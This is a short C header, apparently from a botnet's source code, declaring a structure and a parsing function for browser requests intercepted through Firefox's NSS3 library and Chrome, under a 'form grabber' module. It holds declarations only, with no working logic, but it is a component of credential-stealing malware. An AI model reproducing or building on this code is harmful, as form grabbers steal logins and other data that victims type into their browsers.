#pragma once
#include "modules.h"

#ifdef MODULE_FORMGRABBER
#include "..\common\bot_structs.h"

typedef struct  
{
	void* fd;
	LPSTR url;

	//For chrome, because first is sent Header and only then Data
	LPSTR Header, Data;
}nss3_request_t;

BOOL ParseNss3RequestFromBuffer(nss3_request_t* pRequest, const LPSTR pszBuffer);
#endif